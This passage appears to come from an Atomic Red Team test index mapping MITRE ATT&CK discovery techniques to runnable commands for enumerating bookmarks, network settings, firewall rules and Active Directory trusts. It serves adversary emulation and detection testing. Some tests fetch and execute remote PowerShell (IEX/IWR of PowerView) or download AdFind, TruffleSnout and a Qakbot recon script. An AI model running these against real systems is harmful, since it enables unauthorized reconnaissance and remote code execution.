          '
        name: sh
    - name: List Google Chrome Bookmark JSON Files on macOS
      auto_generated_guid: b789d341-154b-4a42-a071-9111588be9bc
      description: 'Searches for Google Chrome''s Bookmark file (on macOS) that contains
        bookmarks in JSON format and lists any found instances to a text file.

        '
      supported_platforms:
      - macos
      input_arguments:
        output_file:
          description: Path where captured results will be placed.
          type: path
          default: "/tmp/T1217-Chrome.txt"
      executor:
        command: |
          find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> #{output_file} \;
          cat #{output_file} 2>/dev/null
        cleanup_command: 'rm -f #{output_file} 2>/dev/null

          '
        name: sh
    - name: List Google Chrome / Opera Bookmarks on Windows with powershell
      auto_generated_guid: faab755e-4299-48ec-8202-fc7885eb6545
      description: |
        Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.
        Upon execution, paths that contain bookmark files will be displayed.
      supported_platforms:
      - windows
      executor:
        command: 'Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction
          SilentlyContinue -Force

          '
        name: powershell
    - name: List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt
      auto_generated_guid: 76f71e2f-480e-4bed-b61e-398fe17499d5
      description: |
        Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.
        Upon execution, paths that contain bookmark files will be displayed.
      supported_platforms:
      - windows
      executor:
        command: 'where /R C:\Users\ Bookmarks

          '
        name: command_prompt
    - name: List Mozilla Firefox bookmarks on Windows with command prompt
      auto_generated_guid: 4312cdbc-79fc-4a9c-becc-53d49c734bc5
      description: |
        Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.
        Upon execution, paths that contain bookmark files will be displayed.
      supported_platforms:
      - windows
      executor:
        command: 'where /R C:\Users\ places.sqlite

          '
        name: command_prompt
    - name: List Internet Explorer Bookmarks using the command prompt
      auto_generated_guid: 727dbcdb-e495-4ab1-a6c4-80c7f77aef85
      description: This test will list the bookmarks for Internet Explorer that are
        found in the Favorites folder
      supported_platforms:
      - windows
      executor:
        command: 'dir /s /b %USERPROFILE%\Favorites

          '
        name: command_prompt
    - name: List Safari Bookmarks on MacOS
      auto_generated_guid: 5fc528dd-79de-47f5-8188-25572b7fafe0
      description: 'This test searches for Safari''s Bookmarks file (on macOS) and
        lists any found instances to a text file.

        '
      supported_platforms:
      - macos
      input_arguments:
        output_file:
          description: Path where captured results will be placed.
          type: path
          default: "/tmp/T1217-Safari.txt"
      executor:
        command: "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file}
          \ncat #{output_file} \n"
        cleanup_command: 'rm -f #{output_file} 2>/dev/null

          '
        name: sh
  T1016:
    technique:
      modified: '2023-03-30T21:01:38.842Z'
      name: System Network Configuration Discovery
      description: "Adversaries may look for details about the network configuration
        and settings, such as IP and/or MAC addresses, of systems they access or through
        information discovery of remote systems. Several operating system administration
        utilities exist that can be used to gather this information. Examples include
        [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101),
        [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries
        may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        on network devices to gather information about configurations and settings,
        such as IP addresses of configured interfaces and static/dynamic routes (e.g.
        <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation:
        Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from
        [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)
        during automated discovery to shape follow-on behaviors, including determining
        certain access within the target network and what actions to do next. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, {{LinkById|T1059.008} commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations.  Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Script: Script Execution'
      type: attack-pattern
      id: attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0
      created: '2017-05-31T21:30:27.342Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1016
        external_id: T1016
      - source_name: 'Mandiant APT41 Global Intrusion '
        description: 'Gyler, C.,Perez D.,Jones, S.,Miller, S.. (2021, February 25).
          This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple
          Exploits. Retrieved February 17, 2022.'
        url: https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1016
    atomic_tests:
    - name: System Network Configuration Discovery on Windows
      auto_generated_guid: 970ab6a1-0157-4f3f-9a73-ec4166754b23
      description: |
        Identify network configuration information

        Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.
      supported_platforms:
      - windows
      executor:
        command: |
          ipconfig /all
          netsh interface show interface
          arp -a
          nbtstat -n
          net config
        name: command_prompt
    - name: List Windows Firewall Rules
      auto_generated_guid: '038263cb-00f4-4b0a-98ae-0696c67e1752'
      description: |
        Enumerates Windows Firewall Rules using netsh.

        Upon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.
      supported_platforms:
      - windows
      executor:
        command: 'netsh advfirewall firewall show rule name=all

          '
        name: command_prompt
    - name: System Network Configuration Discovery
      auto_generated_guid: c141bbdb-7fca-4254-9fd6-f47e79447e17
      description: |
        Identify network configuration information.

        Upon successful execution, sh will spawn multiple commands and output will be via stdout.
      supported_platforms:
      - macos
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if arp command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v arp)" ]; then exit 0; else exit 1;
          fi;

          '
        get_prereq_command: "(which yum && yum -y install net-tools)||(which apt-get
          && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)\n"
      executor:
        command: |
          if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
          if [ -x "$(command -v netstat)" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
        name: sh
    - name: System Network Configuration Discovery (TrickBot Style)
      auto_generated_guid: dafaf052-5508-402d-bf77-51e0700c02e2
      description: |
        Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/

        Upon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.
      supported_platforms:
      - windows
      executor:
        command: |
          ipconfig /all
          net config workstation
          net view /all /domain
          nltest /domain_trusts
        name: command_prompt
    - name: List Open Egress Ports
      auto_generated_guid: 4b467538-f102-491d-ace7-ed487b853bf5
      description: |
        This is to test for what ports are open outbound.  The technique used was taken from the following blog:
        https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/

        Upon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\open-ports.txt.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Path of file to write port scan results
          type: path
          default: "$env:USERPROFILE\\Desktop\\open-ports.txt"
        portfile_url:
          description: URL to top-128.txt
          type: url
          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt
        port_file:
          description: The path to a text file containing ports to be scanned, one
            port per line. The default list uses the top 128 ports as defined by Nmap.
          type: path
          default: PathToAtomicsFolder\T1016\src\top-128.txt
      dependency_executor_name: powershell
      dependencies:
      - description: 'Test requires #{port_file} to exist

          '
        prereq_command: 'if (Test-Path "#{port_file}") {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{port_file}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"
      executor:
        command: "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen
          = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n
          \   $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\",
          $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n
          \   $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result
          = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result
          | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n
          \   }\n    else {\n        $result = \"$port closed\" \n        Write-Host
          -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result
          | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were
          a total of $totalopen open ports out of $totalports ports tested.\"\n$results
          | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n"
        cleanup_command: 'Remove-Item -ErrorAction ignore "#{output_file}"

          '
        name: powershell
    - name: Adfind - Enumerate Active Directory Subnet Objects
      auto_generated_guid: 9bb45dd7-c466-4f93-83a1-be30e56033ee
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -f (objectcategory=subnet)\n"
        name: command_prompt
    - name: Qakbot Recon
      auto_generated_guid: 121de5c6-5818-4868-b8a7-8fd07c455c1b
      description: A list of commands known to be performed by Qakbot for recon purposes
      supported_platforms:
      - windows
      input_arguments:
        recon_commands:
          description: File that houses list of commands to be executed
          type: path
          default: PathToAtomicsFolder\T1016\src\qakbot.bat
      dependency_executor_name: powershell
      dependencies:
      - description: 'File to copy must exist on disk at specified location (#{recon_commands})

          '
        prereq_command: 'if (Test-Path #{recon_commands}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{recon_commands}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat" -OutFile "#{recon_commands}"
      executor:
        command: "#{recon_commands}\n"
        name: command_prompt
    - name: List macOS Firewall Rules
      auto_generated_guid: ff1d8c25-2aa4-4f18-a425-fede4a41ee88
      description: "\"This will test if the macOS firewall is enabled and/or show
        what rules are configured. Must be run with elevated privileges. Upon successful
        execution, these commands will output various information about the firewall
        configuration, including status and specific port/protocol blocks or allows.
        \n\nUsing `defaults`, additional arguments can be added to see filtered details,
        such as `globalstate` for global configuration (\\\"Is it on or off?\\\"),
        `firewall` for common application allow rules, and `explicitauths` for specific
        rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate
        or --listapps can be used for similar filtering. At least one flag is required
        to send parseable output to standard out. \n"
      supported_platforms:
      - macos
      executor:
        command: |
          sudo defaults read /Library/Preferences/com.apple.alf
          sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
        name: bash
        elevation_required: true
    - name: DNS Server Discovery Using nslookup
      auto_generated_guid: 34557863-344a-468f-808b-a1bfb89b4fa9
      description: |
        Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain
        controller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/
      supported_platforms:
      - windows
      executor:
        command: 'nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%

          '
        name: command_prompt
  T1087:
    technique:
      modified: '2023-04-15T17:24:23.029Z'
      name: Account Discovery
      description: |-
        Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

        Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.

        For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Daniel Stepanic, Elastic
      - Microsoft Threat Intelligence Center (MSTIC)
      - Travis Smith, Tripwire
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        Monitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_version: '2.4'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'File: File Access'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08
      created: '2017-05-31T21:31:06.988Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1087
        external_id: T1087
      - source_name: Elastic - Koadiac Detection with EQL
        description: 'Stepanic, D.. (2020, January 13). Embracing offensive tooling:
          Building detections against Koadic using EQL. Retrieved November 30, 2020.'
        url: https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1482:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Dave Westgard
      - Elia Florio, Microsoft
      - Mnemonic
      - RedHuntLabs, @redhuntlabs
      - ExtraHop
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0
      created: '2019-02-14T16:15:05.974Z'
      x_mitre_version: '1.2'
      external_references:
      - source_name: mitre-attack
        external_id: T1482
        url: https://attack.mitre.org/techniques/T1482
      - source_name: Microsoft Operation Wilysupply
        url: https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/
        description: Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation
          WilySupply software supply chain cyberattack. Retrieved February 14, 2019.
      - source_name: AdSecurity Forging Trust Tickets
        url: https://adsecurity.org/?p=1588
        description: Metcalf, S. (2015, July 15). It’s All About Trust – Forging Kerberos
          Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved
          February 14, 2019.
      - source_name: Microsoft Trusts
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)
        description: Microsoft. (2009, October 7). Trust Technologies. Retrieved February
          14, 2019.
      - source_name: Microsoft GetAllTrustRelationships
        url: https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships
        description: Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved
          February 14, 2019.
      - source_name: Harmj0y Domain Trusts
        url: https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944
        description: Schroeder, W. (2017, October 30). A Guide to Attacking Domain
          Trusts. Retrieved February 14, 2019.
      x_mitre_deprecated: false
      revoked: false
      description: 'Adversaries may attempt to gather information on domain trust
        relationships that may be used to identify lateral movement opportunities
        in Windows multi-domain/forest environments. Domain trusts provide a mechanism
        for a domain to allow access to resources based on the authentication procedures
        of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users
        of the trusted domain to access resources in the trusting domain. The information
        discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005),
        [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation:
        AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain
        trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call,
        .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility
        [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries
        to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)'
      modified: '2022-06-16T19:18:22.305Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Domain Trust Discovery
      x_mitre_detection: |
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Network Traffic: Network Traffic Content'
      - 'Script: Script Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1482
    atomic_tests:
    - name: Windows - Discover domain trusts with dsquery
      auto_generated_guid: 4700a710-c821-4e17-a3ec-9e4c81d6845f
      description: |
        Uses the dsquery command to discover domain trusts.
        Requires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.
      supported_platforms:
      - windows
      executor:
        command: 'dsquery * -filter "(objectClass=trustedDomain)" -attr *

          '
        name: command_prompt
    - name: Windows - Discover domain trusts with nltest
      auto_generated_guid: 2e22641d-0498-48d2-b9ff-c71e496ccdbe
      description: |
        Uses the nltest command to discover domain trusts.
        Requires the installation of nltest via Windows RSAT or the Windows Server AD DS role.
        This technique has been used by the Trickbot malware family.
      supported_platforms:
      - windows
      dependencies:
      - description: 'nltest.exe from RSAT must be present on disk

          '
        prereq_command: 'WHERE nltest.exe >NUL 2>&1

          '
        get_prereq_command: 'echo Sorry RSAT must be installed manually

          '
      executor:
        command: |
          nltest /domain_trusts
          nltest /trusted_domains
        name: command_prompt
    - name: Powershell enumerate domains and forests
      auto_generated_guid: c58fbc62-8a62-489e-8f2d-3565d7d96f30
      description: |
        Use powershell to enumerate AD information.
        Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'PowerView PowerShell script must exist on disk

          '
        prereq_command: 'if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit
          1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
          -OutFile "$env:TEMP\PowerView.ps1"

          '
      - description: 'RSAT PowerShell AD admin cmdlets must be installed

          '
        prereq_command: 'if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And
          (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else {
          exit 1 }

          '
        get_prereq_command: 'Write-Host "Sorry RSAT must be installed manually"

          '
      executor:
        command: |
          Import-Module "$env:TEMP\PowerView.ps1"
          Get-NetDomainTrust
          Get-NetForestTrust
          Get-ADDomain
          Get-ADGroupMember Administrators -Recursive
          ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
        name: powershell
    - name: Adfind - Enumerate Active Directory OUs
      auto_generated_guid: d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -f (objectcategory=organizationalUnit)\n"
        name: command_prompt
    - name: Adfind - Enumerate Active Directory Trusts
      auto_generated_guid: 15fe436d-e771-4ff3-b655-2dca9ba52834
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -gcb -sc trustdmp\n"
        name: command_prompt
    - name: Get-DomainTrust with PowerView
      auto_generated_guid: f974894c-5991-4b19-aaf5-7cc2fe298c5d
      description: 'Utilizing PowerView, run Get-DomainTrust to identify domain trusts.
        Upon execution, progress and info about trusts within the domain being scanned
        will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
        name: powershell
    - name: Get-ForestTrust with PowerView
      auto_generated_guid: 58ed10e8-0738-4651-8408-3a3e9a526279
      description: 'Utilizing PowerView, run Get-ForestTrust to identify forest trusts.
        Upon execution, progress and info about forest trusts within the domain being
        scanned will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
        name: powershell
    - name: TruffleSnout - Listing AD Infrastructure
      auto_generated_guid: ea1b4f2d-5b82-4006-b64f-f2845608a3bf
      description: 'Iterative AD discovery toolkit for offensive operators. Situational
        awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout

        '
      supported_platforms:
      - windows
      input_arguments:
        trufflesnout_path:
          description: Path to the TruffleSnout executable
          type: path
          default: PathToAtomicsFolder\T1482\src\TruffleSnout.exe
        domain:
          description: Domain name to search on
          type: string
          default: "%userdomain%"
      dependency_executor_name: powershell
      dependencies:
      - description: 'TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})

          '
        prereq_command: 'if (Test-Path #{trufflesnout_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -ItemType Directory (Split-Path #{trufflesnout_path}) -Force | Out-Null
          Invoke-WebRequest -Uri "https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe" -OutFile #{trufflesnout_path}
      executor:
        command: |
          #{trufflesnout_path} forest -n #{domain}
          #{trufflesnout_path} domain -n #{domain}
        name: command_prompt
  T1083:
    technique:
      modified: '2023-03-30T21:01:42.631Z'
      name: File and Directory Discovery
      description: |-
        Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: "System and network discovery techniques normally occur throughout
        an operation as an adversary learns the environment. Data and events should
        not be viewed in isolation, but as part of a chain of behavior that could
        lead to other activities, such as Collection and Exfiltration, based on the
        information obtained.\n\nMonitor processes and command-line arguments for
        actions that could be taken to gather system and network information. Remote
        access tools with built-in features may interact directly with the Windows
        API to gather information. Information may also be acquired through Windows
        system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Further,
        [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands
        may also be used to gather file and directory information with built-in features
        native to the network device platform.  Monitor CLI activity for unexpected
        or unauthorized use of commands being run by non-standard users from non-standard
        locations.  "
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_system_requirements:
      - Some folders may require Administrator, SYSTEM or specific user depending
        on permission levels and access controls
      type: attack-pattern
      id: attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18
